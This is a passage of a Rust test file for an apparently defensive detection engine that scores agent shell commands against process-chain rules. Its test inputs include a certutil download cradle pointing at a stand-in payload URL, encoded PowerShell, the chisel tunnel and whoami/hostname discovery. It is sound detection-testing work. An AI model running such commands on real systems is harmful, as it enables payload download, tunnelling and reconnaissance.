use std::collections::{BTreeMap, BTreeSet};

use telltale_rules::process_chain::{
    ProcessChainContext, load_default_process_chain_rules, load_process_chain_rules,
};
use telltale_schema::observation::{
    CanonicalObservationV2, CapabilityAvailability, CapabilityContext, CapabilityId, CorrelationId,
    FactMetadata, FactProvenance, Fidelity, IngestionMode, JsonValue, MessageObservation,
    MessageRole, ObservationBody, ObservationFamily, ObservationStage, ObservedAt,
    ProcessObservation as CanonicalProcess, SemanticFacet, SourceProvenance, ToolObservation,
    ToolStatus,
};

use super::*;
use crate::v2::{FindingKind, NonEvaluationReason};

const OBSERVED_AT: &str = "2026-09-17T12:00:00Z";

fn source(native_id: &str) -> SourceProvenance {
    SourceProvenance::new(
        IngestionMode::Harness,
        "synthetic",
        "process-chain-v2-tests",
        Fidelity::FullNative,
    )
    .unwrap()
    .with_native_id(native_id)
    .unwrap()
}

fn metadata(provenance: FactProvenance) -> FactMetadata {
    FactMetadata::new(
        provenance,
        telltale_schema::observation::Sensitivity::Normal,
    )
    .unwrap()
}

fn tool(
    stage: ObservationStage,
    command_text: Option<&str>,
    searchable_arguments: Option<&str>,
    arguments: Option<JsonValue>,
    tool_name: &str,
    native_id: &str,
) -> CanonicalObservationV2 {
    tool_with_session_and_time(
        stage,
        command_text,
        searchable_arguments,
        arguments,
        tool_name,
        native_id,
        Some("session:process-v2"),
        None,
    )
}

fn timed_command(
    command: &str,
    native_id: &str,
    session_id: Option<&str>,
    occurred_at: Option<&str>,
) -> CanonicalObservationV2 {
    tool_with_session_and_time(
        ObservationStage::ToolRequested,
        Some(command),
        None,
        None,
        "shell",
        native_id,
        session_id,
        occurred_at,
    )
}

#[allow(clippy::too_many_arguments)]
fn tool_with_session_and_time(
    stage: ObservationStage,
    command_text: Option<&str>,
    searchable_arguments: Option<&str>,
    arguments: Option<JsonValue>,
    tool_name: &str,
    native_id: &str,
    session_id: Option<&str>,
    occurred_at: Option<&str>,
) -> CanonicalObservationV2 {
    tool_with_session_time_and_capability(
        stage,
        command_text,
        searchable_arguments,
        arguments,
        tool_name,
        native_id,
        session_id,
        occurred_at,
        CapabilityAvailability::Supported,
    )
}

#[allow(clippy::too_many_arguments)]
fn tool_with_session_time_and_capability(
    stage: ObservationStage,
    command_text: Option<&str>,
    searchable_arguments: Option<&str>,
    arguments: Option<JsonValue>,
    tool_name: &str,
    native_id: &str,
    session_id: Option<&str>,
    occurred_at: Option<&str>,
    tool_call_capability: CapabilityAvailability,
) -> CanonicalObservationV2 {
    let has_arguments = arguments.is_some();
    let mut body = ToolObservation::new().with_name(tool_name).unwrap();
    if let Some(arguments) = arguments {
        body = body.with_arguments(arguments);
    }
    if let Some(searchable) = searchable_arguments {
        body = body.with_searchable_arguments(searchable).unwrap();
    }
    if stage == ObservationStage::ToolExecutionCompleted {
        body = body.with_reported_status(ToolStatus::Succeeded);
    }
    if stage == ObservationStage::ToolResultReturned {
        body = body.with_result(JsonValue::string("synthetic result"));
    }

    let mut builder = CanonicalObservationV2::builder(
        ObservationBody::Tool(body),
        stage,
        ObservedAt::new(OBSERVED_AT).unwrap(),
        source(native_id),
    );
    if let Some(session_id) = session_id {
        builder = builder.session_id(CorrelationId::source_reported(session_id).unwrap());
    }
    if let Some(occurred_at) = occurred_at {
        builder = builder
            .occurred_at(telltale_schema::observation::SourceTimestamp::new(occurred_at).unwrap());
    }
    let mut builder = builder
        .capability_context(
            CapabilityContext::new().with_override(CapabilityId::ToolCall, tool_call_capability),
        )
        .fact_metadata("tool.name", metadata(FactProvenance::Reported));
    if has_arguments {
        builder = builder.fact_metadata("tool.arguments", metadata(FactProvenance::Reported));
    }
    if searchable_arguments.is_some() {
        builder = builder.fact_metadata(
            "tool.searchable_arguments",
            metadata(FactProvenance::Reported),
        );
    }
    if stage == ObservationStage::ToolExecutionCompleted {
        builder = builder.fact_metadata("tool.reported_status", metadata(FactProvenance::Reported));
    }
    if stage == ObservationStage::ToolResultReturned {
        builder = builder.fact_metadata("tool.result", metadata(FactProvenance::Reported));
    }
    if let Some(command_text) = command_text {
        builder = builder
            .facet(
                "command.text",
                SemanticFacet::new(JsonValue::string(command_text)),
            )
            .unwrap()
            .fact_metadata("command.text", metadata(FactProvenance::Parsed));
    }
    builder.build().unwrap()
}

fn requested_command(command: &str, native_id: &str) -> CanonicalObservationV2 {
    tool(
        ObservationStage::ToolRequested,
        Some(command),
        None,
        None,
        "shell",
        native_id,
    )
}

fn default_results(command: &str, native_id: &str) -> Vec<DetectorResult> {
    evaluate_tool_process_chains(
        &load_default_process_chain_rules().unwrap(),
        &requested_command(command, native_id),
        &ProcessChainContext::default(),
    )
    .unwrap()
}

fn result<'a>(results: &'a [DetectorResult], id: &str) -> &'a DetectorResult {
    results
        .iter()
        .find(|result| result.detector().id() == id)
        .unwrap_or_else(|| panic!("missing {id}"))
}

#[test]
fn a_declared_role_keeps_authored_text_out_of_the_command_candidates() {
    use crate::v2::declared_role_selector_tests::Call;
    use serde_json::{Value, json};
    use telltale_schema::observation::{ToolKind, ToolOperation};

    let text = "cmd.exe /c whoami";
    let encoded = json!({"command": text}).to_string();
    let candidates = |operation| {
        let observation = Call {
            name: "apply_patch",
            arguments: Value::String(encoded.clone()),
            searchable: Some(&encoded),
            command: Some(text),
            operation,
        }
        .observation();
        command_candidates(&observation)
            .into_iter()
            .map(str::to_owned)
            .collect::<Vec<_>>()
    };
    // With no role the facet and the argument text are command lines.
    assert_eq!(candidates(None), [text.to_owned(), encoded.clone()]);
    let write = ToolOperation::new(ToolKind::FileWrite);
    assert_eq!(
        candidates(Some(write.clone())),
        [text.to_owned(), encoded.clone()]
    );
    // The command member holds authored text: no candidate, as for the
    // Claude `Write` reference, whose arguments are an object.
    assert!(candidates(Some(write.clone().with_authored_key("command"))).is_empty());
    // Another member is authored: the command facet remains a candidate.
    assert_eq!(
        candidates(Some(write.with_authored_key("file_text"))),
        [text.to_owned()]
    );
}

#[test]
fn explicit_parent_child_uses_the_tool_observation_identity() {
    let rules = load_default_process_chain_rules().unwrap();
    let observation = requested_command("cmd.exe /c whoami", "explicit");
    let results =
        evaluate_tool_process_chains(&rules, &observation, &ProcessChainContext::default())
            .unwrap();
    let matched = result(&results, "procchain.discovery.cmd_whoami");

    assert_eq!(
        matched.evaluation_status(),
        EvaluationStatus::EvaluatedMatch
    );
    assert_eq!(matched.detector().kind(), DetectorKind::ProcessChain);
    assert_eq!(matched.detector().rule_version(), Some(1));
    assert_eq!(matched.observation_ids(), [observation.observation_id()]);
    assert_eq!(matched.session_id(), Some("session:process-v2"));
    assert_eq!(matched.correlation_scope(), CorrelationScope::Process);
    assert_eq!(
        matched
            .capability_context()
            .expect("capability context")
            .resolve(CapabilityId::ToolCall),
        CapabilityAvailability::Supported
    );
    assert_eq!(observation.kind(), ObservationFamily::Tool);
    assert_ne!(observation.stage(), ObservationStage::ProcessObserved);
}

#[test]
fn tool_derived_matcher_inputs_use_only_canonical_session_scope() {
    let rules = load_default_process_chain_rules().unwrap();
    let observation = timed_command(
        "cmd.exe /c hostname",
        "session-scope",
        Some("opaque|session:value"),
        Some("2026-09-17T10:00:00Z"),
    );
    let inputs = command_derived_process_matcher_inputs(&observation);
    assert!(!inputs.is_empty());
    assert!(
        inputs
            .iter()
            .all(|input| input.host.is_none() && input.user.is_none())
    );

    let mut budget = super::super::session::RetentionBudget::new();
    let matches = evaluate_tool_process_chain_matches(
        &rules,
        &observation,
        &ProcessChainContext::default(),
        0,
        &mut budget,
    )
    .unwrap();
    assert!(
        matches
            .iter()
            .all(|matched| matched.result.session_id() == Some("opaque|session:value"))
    );
}

#[test]
fn standalone_command_indicator_uses_the_same_path() {
    let results = default_results("powershell -enc AAAAAAAAAAAAAAAAAAAAAAAA", "standalone");
    let matched = result(&results, "procchain.execution.encoded_powershell");
    assert_eq!(matched.detector().kind(), DetectorKind::ProcessChain);
    assert_eq!(
        matched.evaluation_status(),
        EvaluationStatus::EvaluatedMatch
    );
}

#[test]
fn zero_risk_match_materializes_an_ordinary_signal_and_finding() {
    let results = default_results("cmd.exe /c hostname", "informational");
    let matched = result(&results, "procchain.discovery.cmd_hostname");
    assert_eq!(matched.risk_points(), Some(0));
    assert_eq!(matched.severity(), Severity::Informational);
    assert_eq!(matched.finding_kind(), FindingKind::ThreatHunt);

    let signal = matched.signal().unwrap().expect("signal");
    let finding = signal.finding().expect("finding");
    assert_eq!(signal.risk_points(), Some(0));
    assert_eq!(finding.risk_points(), Some(0));
    assert_eq!(finding.detectors()[0].kind(), DetectorKind::ProcessChain);
    assert_eq!(finding.observation_ids(), matched.observation_ids());
}

#[test]
fn inferred_parent_weakens_confidence_without_runtime_identity() {
    let rules = load_default_process_chain_rules().unwrap();
    let observation = tool(
        ObservationStage::ToolRequested,
        None,
        None,
        Some(JsonValue::string(
            "certutil -urlcache https://example.invalid/payload",
        )),
        "shell",
        "inferred",
    );
    let derived = command_derived_process_matcher_inputs(&observation);
    let input = derived
        .iter()
        .find(|input| input.child.normalized_name() == "certutil")
        .expect("derived matcher input");
    assert!(input.parent_inferred);
    assert_eq!(input.parent.normalized_name(), "cmd");
    assert_eq!(input.parent.pid, None);
    assert_eq!(input.child.pid, None);
    assert_eq!(input.source_event_id, None);

    let results =
        evaluate_tool_process_chains(&rules, &observation, &ProcessChainContext::default())
            .unwrap();
    assert_eq!(
        result(&results, "procchain.c2.certutil_download_cradle").confidence(),
        Some(Confidence::Medium)
    );
    assert_eq!(observation.kind(), ObservationFamily::Tool);
}

#[test]
fn caller_context_softens_but_does_not_remove_a_match() {
    let rules = load_default_process_chain_rules().unwrap();
    let observation = requested_command("cmd.exe /c chisel", "context");
    let baseline =
        evaluate_tool_process_chains(&rules, &observation, &ProcessChainContext::default())
            .unwrap();
    let mut context = ProcessChainContext::default();
    context.approved_rmm_products.insert("chisel".to_owned());
    let softened = evaluate_tool_process_chains(&rules, &observation, &context).unwrap();

    let baseline = result(&baseline, "procchain.c2.cmd_chisel");
    let softened = result(&softened, "procchain.c2.cmd_chisel");
    assert_eq!(
        (baseline.risk_points(), baseline.severity()),
        (Some(85), Severity::Critical)
    );
    assert_eq!(
        (softened.risk_points(), softened.severity()),
        (Some(55), Severity::High)
    );
    assert_eq!(
        softened.evaluation_status(),
        EvaluationStatus::EvaluatedMatch
    );
}

#[test]
fn command_line_gated_match_is_not_softened() {
    let rules = load_default_process_chain_rules().unwrap();
    let observation = requested_command(
        "cmd.exe /c certutil -urlcache https://example.invalid/payload",
        "gated",
    );
    let mut context = ProcessChainContext::default();
    context.approved_rmm_products.insert("certutil".to_owned());
    let results = evaluate_tool_process_chains(&rules, &observation, &context).unwrap();
    let matched = result(&results, "procchain.c2.certutil_download_cradle");
    assert_eq!(matched.risk_points(), Some(58));
    assert_eq!(matched.severity(), Severity::High);
}

#[test]
fn authoritative_rule_dedup_winner_and_merged_techniques_are_normalized() {
    let rules = load_process_chain_rules(
            r#"
version: 1
description: synthetic dedupe
defaults: { enabled: true, risk_entity: host, suppression_window_seconds: 3600 }
categories:
  synthetic:
    detection_class: security_detection
    analytic_intent: alert
    investigation_fields: []
    falsepositives: []
rules:
  - { id: procchain.synthetic.weak, title: weak, category: synthetic, severity: low, score: 20, confidence: low, parent: cmd, child: whoami, mitre: [T1219], reason: weak }
  - { id: procchain.synthetic.strong, title: strong, category: synthetic, severity: high, score: 50, confidence: high, parent: cmd, child: whoami, mitre: [T1003.001], reason: strong }
standalone: []
correlations: []
"#,
        )
        .unwrap();
    let observation = requested_command("cmd.exe /c whoami", "dedupe");
    let results =
        evaluate_tool_process_chains(&rules, &observation, &ProcessChainContext::default())
            .unwrap();

    assert_eq!(results.len(), 1);
    assert_eq!(results[0].detector().id(), "procchain.synthetic.strong");
    assert_eq!(
        results[0].techniques(),
        ["attack:T1003.001", "attack:T1219"]
    );
}

#[test]
fn attack_normalization_is_strict_and_malformed_pack_values_fail_closed() {
    assert_eq!(normalize_attack_technique("T1219").unwrap(), "attack:T1219");
    assert_eq!(
        normalize_attack_technique("T1003.001").unwrap(),
        "attack:T1003.001"
    );
    for malformed in ["T121", "t1219", "T1003.01", "T1003.001x", "not-attack"] {
        assert_eq!(
            normalize_attack_technique(malformed).unwrap_err(),
            DetectionError::InvalidMetadata
        );
    }

    let rules = load_process_chain_rules(
            r#"
version: 1
description: malformed technique
defaults: { enabled: true, risk_entity: host, suppression_window_seconds: 3600 }
categories:
  synthetic: { detection_class: security_detection, analytic_intent: alert, investigation_fields: [], falsepositives: [] }
rules:
  - { id: procchain.synthetic.invalid_attack, title: invalid, category: synthetic, severity: low, score: 20, confidence: low, parent: cmd, child: whoami, mitre: [invalid], reason: invalid }
standalone: []
correlations: []
"#,
        )
        .unwrap();
    assert_eq!(
        evaluate_tool_process_chains(
            &rules,
            &requested_command("cmd.exe /c whoami", "invalid-attack"),
            &ProcessChainContext::default(),
        )
        .unwrap_err(),
        DetectionError::InvalidMetadata
    );
}

#[test]
fn unsafe_process_dedupe_text_keeps_bounded_stable_distinct_findings() {
    let rules = load_process_chain_rules(r#"
version: 1
description: synthetic executable names
defaults: { enabled: true, risk_entity: host, suppression_window_seconds: 3600 }
categories:
  discovery: { detection_class: security_detection, analytic_intent: alert, investigation_fields: [], falsepositives: [] }
rules: []
standalone:
  - { id: procchain.synthetic.helper, title: helper, category: discovery, severity: informational, score: 0, confidence: low, match: process_name, patterns: ["helper"], mitre: [T1082], reason: synthetic }
correlations: []
"#).unwrap();
    let key = |name: &str| {
        let command = format!("\"{name}.exe\" --version");
        let result = evaluate_tool_process_chains(
            &rules,
            &requested_command(&command, "synthetic-name"),
            &ProcessChainContext::default(),
        )
        .unwrap();
        assert_eq!(result.len(), 1);
        result[0].dedupe_key().unwrap().to_owned()
    };
    let first = key("helper utility");
    assert!(first.starts_with("process:sha256:"));
    assert_eq!(first, key("helper utility"));
    assert_ne!(first, key("helper other"));
    assert_eq!(
        key("helper"),
        "standalone:procchain.synthetic.helper:helper"
    );
    for raw in ["", "a/b", "a\\b", "a..b", "a\nb", &"x".repeat(100)] {
        let normalized = atomic_dedupe_key(raw);
        assert!(
            super::super::types::bounded_opaque(&normalized, super::super::types::MAX_ID_BYTES)
                .is_ok()
        );
        assert_eq!(normalized, atomic_dedupe_key(raw));
    }
}

#[test]
fn unsupported_detection_class_fails_closed() {
    let rules = load_process_chain_rules(
            r#"
version: 1
description: unsupported class
defaults: { enabled: true, risk_entity: host, suppression_window_seconds: 3600 }
categories:
  synthetic: { detection_class: operational_health, analytic_intent: alert, investigation_fields: [], falsepositives: [] }
rules:
  - { id: procchain.synthetic.unsupported_class, title: invalid, category: synthetic, severity: low, score: 20, confidence: low, parent: cmd, child: whoami, mitre: [T1219], reason: invalid }
standalone: []
correlations: []
"#,
        )
        .unwrap();
    assert_eq!(
        evaluate_tool_process_chains(
            &rules,
            &requested_command("cmd.exe /c whoami", "unsupported-class"),
            &ProcessChainContext::default(),
        )
        .unwrap_err(),
        DetectionError::UnmappableRuleClass
    );
}

#[test]
fn only_command_bearing_tool_evidence_is_eligible() {
    let rules = load_default_process_chain_rules().unwrap();
    let message = CanonicalObservationV2::builder(
        ObservationBody::Message(
            MessageObservation::new(MessageRole::User)
                .with_content(JsonValue::string("cmd.exe /c whoami")),
        ),
        ObservationStage::MessageObserved,
        ObservedAt::new(OBSERVED_AT).unwrap(),
        source("message"),
    )
    .fact_metadata("message.role", metadata(FactProvenance::Reported))
    .fact_metadata("message.content", metadata(FactProvenance::Reported))
    .build()
    .unwrap();
    let name_only = tool(
        ObservationStage::ToolRequested,
        None,
        None,
        None,
        "cmd.exe /c whoami",
        "name-only",
    );
    let result_stage = tool(
        ObservationStage::ToolResultReturned,
        Some("cmd.exe /c whoami"),
        Some("cmd.exe /c whoami"),
        Some(JsonValue::string("cmd.exe /c whoami")),
        "shell",
        "result-stage",
    );
    let object_arguments = tool(
        ObservationStage::ToolRequested,
        None,
        None,
        Some(JsonValue::Object(BTreeMap::from([(
            "command".to_owned(),
            JsonValue::string("cmd.exe /c whoami"),
        )]))),
        "shell",
        "object",
    );
    let parsed_searchable = CanonicalObservationV2::builder(
        ObservationBody::Tool(
            ToolObservation::new()
                .with_name("shell")
                .unwrap()
                .with_searchable_arguments("cmd.exe /c whoami")
                .unwrap(),
        ),
        ObservationStage::ToolRequested,
        ObservedAt::new(OBSERVED_AT).unwrap(),
        source("parsed-searchable"),
    )
    .fact_metadata("tool.name", metadata(FactProvenance::Reported))
    .fact_metadata(
        "tool.searchable_arguments",
        metadata(FactProvenance::Parsed),
    )
    .build()
    .unwrap();

    for observation in [
        &message,
        &name_only,
        &result_stage,
        &object_arguments,
        &parsed_searchable,
    ] {
        assert!(
            evaluate_tool_process_chains(&rules, observation, &ProcessChainContext::default(),)
                .unwrap()
                .is_empty()
        );
    }
}

#[test]
fn identical_command_surfaces_are_parsed_once() {
    let observation = tool(
        ObservationStage::ToolRequested,
        Some("cmd.exe /c whoami"),
        Some("cmd.exe /c whoami"),
        Some(JsonValue::string("cmd.exe /c whoami")),
        "shell",
        "candidate-dedupe",
    );
    assert_eq!(command_candidates(&observation), ["cmd.exe /c whoami"]);
    assert_eq!(
        command_derived_process_matcher_inputs(&observation).len(),
        1
    );
}

#[test]
fn distinct_command_surfaces_are_evaluated_without_duplicate_result_identity() {
    let observation = tool(
        ObservationStage::ToolRequested,
        Some("cmd.exe /c whoami"),
        Some("cmd.exe /c hostname"),
        Some(JsonValue::string("cmd /c whoami /all")),
        "shell",
        "distinct-candidates",
    );
    let results = evaluate_tool_process_chains(
        &load_default_process_chain_rules().unwrap(),
        &observation,
        &ProcessChainContext::default(),
    )
    .unwrap();
    let ids = results
        .iter()
        .map(|result| result.detector().id())
        .collect::<BTreeSet<_>>();
    assert!(ids.contains("procchain.discovery.cmd_whoami"));
    assert!(ids.contains("procchain.discovery.cmd_hostname"));
    assert_eq!(
        results
            .iter()
            .filter(|result| result.detector().id() == "procchain.discovery.cmd_whoami")
            .count(),
        1,
        "one Tool observation must not emit duplicate Signal identity"
    );
    let signal_ids = results
        .iter()
        .map(|result| result.signal().unwrap().unwrap().signal_id().to_owned())
        .collect::<BTreeSet<_>>();
    assert_eq!(signal_ids.len(), results.len());
    assert!(
        results
            .windows(2)
            .all(|pair| { pair[0].detector().id() <= pair[1].detector().id() })
    );
}

#[test]
fn lifecycle_stage_policy_is_source_neutral_and_excludes_results() {
    let rules = load_default_process_chain_rules().unwrap();
    for (stage, id) in [
        (ObservationStage::ToolProposed, "proposed"),
        (ObservationStage::ToolRequested, "requested"),
        (ObservationStage::ToolExecutionStarted, "started"),
        (ObservationStage::ToolExecutionCompleted, "completed"),
    ] {
        let observation = tool(stage, Some("cmd.exe /c whoami"), None, None, "shell", id);
        assert!(
            evaluate_tool_process_chains(&rules, &observation, &ProcessChainContext::default(),)
                .unwrap()
                .iter()
                .any(|result| result.detector().id() == "procchain.discovery.cmd_whoami")
        );
    }
    let returned = tool(
        ObservationStage::ToolResultReturned,
        Some("cmd.exe /c whoami"),
        None,
        None,
        "shell",
        "returned",
    );
    assert!(
        evaluate_tool_process_chains(&rules, &returned, &ProcessChainContext::default())
            .unwrap()
            .is_empty()
    );
}

#[test]
fn process_chain_materialization_debug_does_not_expose_command_evidence() {
    let marker = "synthetic-secret-marker-C:\\private\\token.txt";
    let command = format!("cmd.exe /c whoami {marker}");
    let results = default_results(&command, "privacy");
    let matched = result(&results, "procchain.discovery.cmd_whoami");
    let signal = matched.signal().unwrap().expect("signal");
    let finding = signal.finding().expect("finding");
    for debug in [
        format!("{matched:?}"),
        format!("{signal:?}"),
        format!("{finding:?}"),
    ] {
        assert!(!debug.contains(marker), "debug leaked command evidence");
        assert!(!debug.contains("private"), "debug leaked a path");
    }
}

#[test]
fn canonical_process_observations_are_not_consumed() {
    let observation = CanonicalObservationV2::builder(
        ObservationBody::Process(CanonicalProcess::new().with_operation("exec").unwrap()),
        ObservationStage::ProcessObserved,
        ObservedAt::new(OBSERVED_AT).unwrap(),
        source("direct-process"),
    )
    .fact_metadata("process.operation", metadata(FactProvenance::Observed))
    .build()
    .unwrap();
    assert!(
        evaluate_tool_process_chains(
            &load_default_process_chain_rules().unwrap(),
            &observation,
            &ProcessChainContext::default(),
        )
        .unwrap()
        .is_empty()
    );
}

#[test]
fn only_process_chain_is_newly_runtime_supported() {
    let metadata = FindingMetadata::new(
        FindingKind::Informational,
        "synthetic",
        Severity::Informational,
    )
    .unwrap();
    let process_chain = DetectorResult::new(
        DetectorIdentity::new(DetectorKind::ProcessChain, "procchain.synthetic").unwrap(),
        EvaluationStatus::EvaluatedNoMatch,
        metadata.clone(),
    );
    assert!(process_chain.is_ok());

    for kind in [
        DetectorKind::Sequence,
        DetectorKind::Correlation,
        DetectorKind::Imported,
        DetectorKind::Baseline,
        DetectorKind::GuardModel,
    ] {
        assert_eq!(
            DetectorResult::new(
                DetectorIdentity::new(kind, "synthetic.unsupported").unwrap(),
                EvaluationStatus::EvaluatedNoMatch,
                metadata.clone(),
            )
            .unwrap_err(),
            DetectionError::UnsupportedDetectorKind
        );
        assert!(
            DetectorResult::not_evaluated(
                DetectorIdentity::new(kind, "synthetic.unsupported").unwrap(),
                NonEvaluationReason::IneligibleInput,
                metadata.clone(),
            )
            .is_ok()
        );
    }
}

#[test]
fn session_suppresses_repeats_and_retains_private_count() {
    let rules = load_default_process_chain_rules().unwrap();
    let first = timed_command(
        "cmd.exe /c hostname",
        "repeat-first",
        Some("session:repeat"),
        Some("2026-09-17T10:00:00Z"),
    );
    let second = timed_command(
        "cmd.exe /c hostname",
        "repeat-second",
        Some("session:repeat"),
        Some("2026-09-17T10:30:00Z"),
    );
    let evaluation = evaluate_tool_process_chain_session(
        &rules,
        &[&first, &second],
        &ProcessChainContext::default(),
        &ProcessChainSessionConfig::default(),
    )
    .unwrap();
    assert_eq!(evaluation.results().len(), 1);
    assert_eq!(evaluation.suppressed_count(), 1);
    let retained = evaluation
        .results()
        .iter()
        .find(|result| {
            result.detector().id() == "procchain.discovery.cmd_hostname"
                && result.observation_ids() == [first.observation_id()]
        })
        .expect("retained first occurrence");
    assert_eq!(
        evaluation
            .projection
            .get(&super::super::event3::process_result_key(retained))
            .expect("retained occurrence projection")
            .repeat_count,
        Some(2)
    );
}

#[test]
fn suppressed_atomic_occurrence_cannot_satisfy_correlation() {
    let rules = load_default_process_chain_rules().unwrap();
    let anchor = timed_command(
        "cmd.exe /c hostname",
        "suppression-anchor",
        Some("session:suppression-lifecycle"),
        Some("2026-09-17T10:00:00Z"),
    );
    let repeated = timed_command(
        "cmd.exe /c hostname",
        "suppressed-repeat",
        Some("session:suppression-lifecycle"),
        Some("2026-09-17T10:50:00Z"),
    );
    let account = timed_command(
        "cmd.exe /c whoami",
        "correlation-step",
        Some("session:suppression-lifecycle"),
        Some("2026-09-17T10:55:00Z"),
    );

    let evaluation = evaluate_tool_process_chain_session(
        &rules,
        &[&anchor, &repeated, &account],
        &ProcessChainContext::default(),
        &ProcessChainSessionConfig::default(),
    )
    .unwrap();

    assert_eq!(evaluation.suppressed_count(), 1);
    let retained = evaluation
        .results()
        .iter()
        .find(|result| {
            result.detector().id() == "procchain.discovery.cmd_hostname"
                && result.observation_ids() == [anchor.observation_id()]
        })
        .expect("retained anchor occurrence");
    assert_eq!(
        evaluation
            .projection
            .get(&super::super::event3::process_result_key(retained))
            .expect("retained occurrence projection")
            .repeat_count,
        Some(2)
    );
    assert!(!evaluation.results().iter().any(|result| {
        result.detector().id() == "procchain.correlation.host_then_account_discovery"
    }));
}

#[test]
fn repeats_outside_window_and_different_sessions_survive() {
    let rules = load_default_process_chain_rules().unwrap();
    let first = timed_command(
        "cmd.exe /c hostname",
        "outside-first",
        Some("session:outside"),
        Some("2026-09-17T10:00:00Z"),
    );
    let outside = timed_command(
        "cmd.exe /c hostname",
        "outside-second",
        Some("session:outside"),
        Some("2026-09-17T12:01:00Z"),
    );
    let other_session = timed_command(
        "cmd.exe /c hostname",
        "other-session",
        Some("session:other"),
        Some("2026-09-17T10:30:00Z"),
    );
    let evaluation = evaluate_tool_process_chain_session(
        &rules,
        &[&first, &outside, &other_session],
        &ProcessChainContext::default(),
        &ProcessChainSessionConfig::default(),
    )
    .unwrap();
    assert_eq!(evaluation.results().len(), 3);
    assert_eq!(evaluation.suppressed_count(), 0);
}

#[test]
fn repeat_outside_suppression_window_can_start_correlation() {
    let rules = load_default_process_chain_rules().unwrap();
    let original = timed_command(
        "cmd.exe /c hostname",
        "outside-correlation-original",
        Some("session:outside-correlation"),
        Some("2026-09-17T10:00:00Z"),
    );
    let later = timed_command(
        "cmd.exe /c hostname",
        "outside-correlation-later",
        Some("session:outside-correlation"),
        Some("2026-09-17T11:01:00Z"),
    );
    let account = timed_command(
        "cmd.exe /c whoami",
        "outside-correlation-account",
        Some("session:outside-correlation"),
        Some("2026-09-17T11:05:00Z"),
    );

    let evaluation = evaluate_tool_process_chain_session(
        &rules,
        &[&original, &later, &account],
        &ProcessChainContext::default(),
        &ProcessChainSessionConfig::default(),
    )
    .unwrap();

    assert_eq!(evaluation.suppressed_count(), 0);
    let correlation = result(
        evaluation.results(),
        "procchain.correlation.host_then_account_discovery",
    );
    assert_eq!(
        correlation
            .observation_ids()
            .iter()
            .map(String::as_str)
            .collect::<BTreeSet<_>>(),
        [later.observation_id(), account.observation_id()]
            .into_iter()
            .collect::<BTreeSet<_>>()
    );
}

#[test]
fn missing_session_id_keeps_atomic_matches_unjoined() {
    let rules = load_default_process_chain_rules().unwrap();
    let first = timed_command(
        "cmd.exe /c hostname",
        "no-session-first",
        None,
        Some("2026-09-17T10:00:00Z"),
    );
    let second = timed_command(
        "cmd.exe /c hostname",
        "no-session-second",
        None,
        Some("2026-09-17T10:01:00Z"),
    );
    let evaluation = evaluate_tool_process_chain_session(
        &rules,
        &[&first, &second],
        &ProcessChainContext::default(),
        &ProcessChainSessionConfig::default(),
    )
    .unwrap();
    assert_eq!(evaluation.results().len(), 2);
    assert_eq!(evaluation.suppressed_count(), 0);
}

#[test]
fn missing_occurred_at_keeps_atomic_match_but_cannot_suppress_or_correlate() {
    let rules = load_default_process_chain_rules().unwrap();
    let untimed = timed_command(
        "cmd.exe /c hostname",
        "untimed-hostname",
        Some("session:untimed"),
        None,
    );
    let account = timed_command(
        "cmd.exe /c whoami",
        "untimed-account",
        Some("session:untimed"),
        Some("2026-09-17T10:01:00Z"),
    );
    let evaluation = evaluate_tool_process_chain_session(
        &rules,
        &[&untimed, &account],
        &ProcessChainContext::default(),
        &ProcessChainSessionConfig::default(),
    )
    .unwrap();
    assert!(
        evaluation
            .results()
            .iter()
            .any(|result| result.detector().id() == "procchain.discovery.cmd_hostname")
    );
    assert!(
        evaluation
            .results()
            .iter()
            .all(|result| !result.detector().id().starts_with("procchain.correlation."))
    );
    assert_eq!(evaluation.suppressed_count(), 0);
}

#[test]
fn correlation_dedupe_identity_includes_rule_and_session_scope() {
    let rules = load_process_chain_rules(
            r#"
version: 1
description: synthetic correlation identity
defaults: { enabled: true, risk_entity: host, suppression_window_seconds: 3600 }
categories:
  discovery: { detection_class: security_detection, analytic_intent: alert, investigation_fields: [], falsepositives: [] }
rules: []
standalone:
  - { id: procchain.synthetic.hostname, title: hostname, category: discovery, severity: informational, score: 0, confidence: low, match: command_line, patterns: ["\\bhostname\\b"], mitre: [T1082], reason: hostname }
  - { id: procchain.synthetic.whoami, title: whoami, category: discovery, severity: informational, score: 0, confidence: low, match: command_line, patterns: ["\\bwhoami\\b"], mitre: [T1087], reason: whoami }
correlations:
  - id: procchain.correlation.synthetic_one
    title: first
    category: discovery
    severity: medium
    score: 45
    confidence: medium
    mitre: [T1082]
    reason: first
    window_seconds: 60
    entity: host
    sequence:
      - { any_rule_id: [procchain.synthetic.hostname], any_child: [hostname] }
      - { any_rule_id: [procchain.synthetic.whoami], any_child: [whoami] }
  - id: procchain.correlation.synthetic_two
    title: second
    category: discovery
    severity: medium
    score: 45
    confidence: medium
    mitre: [T1082]
    reason: second
    window_seconds: 60
    entity: host
    sequence:
      - { any_rule_id: [procchain.synthetic.hostname], any_child: [hostname] }
      - { any_rule_id: [procchain.synthetic.whoami], any_child: [whoami] }
"#,
        )
        .unwrap();
    let observations = [
        timed_command(
            "cmd.exe /c hostname",
            "identity-host",
            Some("opaque-session"),
            Some("2026-09-17T10:00:00Z"),
        ),
        timed_command(
            "cmd.exe /c whoami",
            "identity-account",
            Some("opaque-session"),
            Some("2026-09-17T10:01:00Z"),
        ),
    ];
    let evaluate = || {
        evaluate_tool_process_chain_session(
            &rules,
            &[&observations[0], &observations[1]],
            &ProcessChainContext::default(),
            &ProcessChainSessionConfig::default(),
        )
        .unwrap()
        .results()
        .iter()
        .filter(|result| result.detector().id().starts_with("procchain.correlation."))
        .map(|result| {
            (
                result.detector().id().to_owned(),
                result.dedupe_key().unwrap().to_owned(),
            )
        })
        .collect::<BTreeMap<_, _>>()
    };
    let first = evaluate();
    let second = evaluate();
    assert_eq!(first, second);
    assert_eq!(first.len(), 2);
    let keys = first.values().collect::<BTreeSet<_>>();
    assert_eq!(keys.len(), 2);
    assert!(
        keys.iter().all(|key| {
            key.starts_with("correlation:sha256:") && !key.contains("opaque-session")
        })
    );
}

#[test]
fn occurred_at_orders_candidates_without_observed_at_fallback() {
    let rules = load_default_process_chain_rules().unwrap();
    // Both observations have the same observed_at in the synthetic helper,
    // while source occurrence time intentionally puts the account step first.
    let hostname = timed_command(
        "cmd.exe /c hostname",
        "occurred-later",
        Some("session:ordering"),
        Some("2026-09-17T10:10:00Z"),
    );
    let account = timed_command(
        "cmd.exe /c whoami",
        "occurred-earlier",
        Some("session:ordering"),
        Some("2026-09-17T10:00:00Z"),
    );
